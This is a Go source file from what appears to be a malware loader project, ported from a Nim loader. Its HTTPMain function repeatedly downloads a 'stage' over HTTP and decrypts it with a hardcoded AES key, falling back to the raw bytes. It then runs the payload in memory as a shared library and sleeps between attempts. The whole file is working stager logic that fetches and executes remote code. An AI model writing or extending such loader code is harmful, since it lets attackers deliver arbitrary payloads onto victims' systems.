package routine

import (
	"loader/capabilities"
	global "loader/utils"
	"loader/utils/crypt"
	"loader/utils/network"
	"loader/utils/stage"
)

// payloadFromResponse — nim loader: tenta AES-GCM com a aesKey; se falhar, usa o raw.
func payloadFromResponse(raw string) []byte {
	// Receives the raw response and returns the decrypted bytes, or the raw text when decrypt fails
	text := crypt.TryCryptDecrypt(global.AesKey, raw)
	if len(text) == 0 && len(raw) > 0 {
		text = raw
	}
	return []byte(text)
}

// HTTPMain — nim loader http.nim: baixa o stage e roda; dorme entre tentativas.
func HTTPMain() {
	// Main function that downloads the stage, runs it, and sleeps between tries
	for {
		resp := network.HTTPGetRaw()
		if resp.OK && resp.Code == 200 && len(resp.Body) > 0 {
			payload := payloadFromResponse(resp.Body)
			if len(payload) > 0 {
				stage.RunSharedLibrary(payload)
				return
			}
		}
		capabilities.Sleep_now()
	}
}